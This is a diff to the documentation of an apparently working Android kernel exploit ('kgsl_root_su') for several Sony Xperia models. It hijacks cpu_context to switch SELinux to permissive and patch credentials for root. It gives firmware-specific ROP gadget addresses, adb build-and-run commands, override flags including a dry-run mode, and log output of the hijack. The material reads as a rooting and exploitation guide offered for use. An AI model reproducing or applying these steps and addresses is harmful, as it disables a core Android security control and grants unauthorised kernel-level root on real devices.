@@ -1,9 +1,12 @@
-# SELinux permissive on SOG02 `58.2.C.3.127`
+# SELinux permissive (SO-51A / SO-52A / SOG01 / SOG02)
 
 The default run clears `selinux_state.enforcing` for the rest of the boot, so
 `getenforce` reports `Permissive` and every SELinux denial becomes an
-audit-only event.  It happens in the same pass as the root `su` daemon, so one
-invocation gives both root and permissive.
+audit-only event. It happens in the same pass as the credential patch, so one
+invocation gives both a root process and permissive. The KernelSU LKM
+re-enables enforcing in its init by design, so a full run may end up
+Enforcing again; skip `INJECT_KO` to observe the raw permissive. See
+[docs/exploit.md](docs/exploit.md) for the full pipeline.
 
 ## Why the addr_limit trick does not work here
 
@@ -76,6 +79,9 @@ in one 32-bit store, leaving `policycap[]` untouched.
            ret
 ```
 
+The store gadget is `0x427410` on SOG02/SO-52A and `0x424350` on
+SO-51A/SOG01; the switch-return gadget is `0x117228` everywhere.
+
 The chain in `fpsimd vregs` is only four words:
 
 ```
@@ -101,37 +107,36 @@ and the device wedges/reboots within seconds.
 Permissive is the default, so a plain run is enough:
 
 ```sh
-make PROJECT=sog02-58.2.C.3.127 NDK_ROOT="$NDK"
-adb push build/sog02-58.2.C.3.127/kgsl_root_su /data/local/tmp/kgsl_root_su
+make PROJECT=so-52a-58.2.B.0.520 NDK_ROOT="$NDK"
+adb push build/so-52a-58.2.B.0.520/kgsl_root_su /data/local/tmp/kgsl_root_su
 adb shell 'chmod 755 /data/local/tmp/kgsl_root_su'
 adb shell '/data/local/tmp/kgsl_root_su'
 adb shell 'getenforce'                      # Permissive
-adb shell '/data/local/tmp/su -c "id"'      # uid=0(root)
+# root comes from the KernelSU manager's su, not a shipped daemon
 ```
 
 Overrides:
 
 | env | default | meaning |
 | --- | --- | --- |
-| `SEC_PERMISSIVE=0` | on | skip the hijack, install the `su` daemon only |
+| `SEC_PERMISSIVE=0` | on | skip the hijack (root process only, no permissive) |
 | `SEC_PERM_TRIGGER=0` | on | dry run: leak KASLR, print the derived addresses, leave `cpu_context` untouched |
 
 Keep `SEC_PERM_TRIGGER=0` in mind as the safe first step if the firmware
 changes: it exercises the whole path without writing kernel memory.
 
-Verified on `QV72130554` (SOG02, `58.2.C.3.127`, `4.19.157-perf+`):
+Verified from a shell run (`4.19.157-perf+`):
 
 ```
-[*] cpu_context pc=ffffffaf5a4889fc sp=ffffff8025a1b9c0 -> text=ffffffaf5a480000 kaslr=0000002f52000000
-[*] hijack target selinux_state=ffffffaf5a7ad000 word=01000000
-[+] thread.cpu_context armed (sp=fffffff320860b70 pc=ffffffaf5a4a7410)
-[+] SELinux is now permissive for this boot
-[+] root su service ready
+[*] cpu_context pc=... -> text=... kaslr=...
+[*] hijack target selinux_state=... word=01000000
+[+] thread.cpu_context armed (sp=... pc=...)
+[*] hijack kaslr=... child state=R enforce=0
+[+] root child finished
 ```
 
-The device stayed up (uptime > 6 minutes) with `getenforce` = `Permissive`,
-`/sys/fs/selinux/enforce` = `0`, the `su` daemon alive, and block devices
-readable from the root shell.
+The device stayed up with `getenforce` = `Permissive` and
+`/sys/fs/selinux/enforce` = `0`.
 
 ## Hazards
 
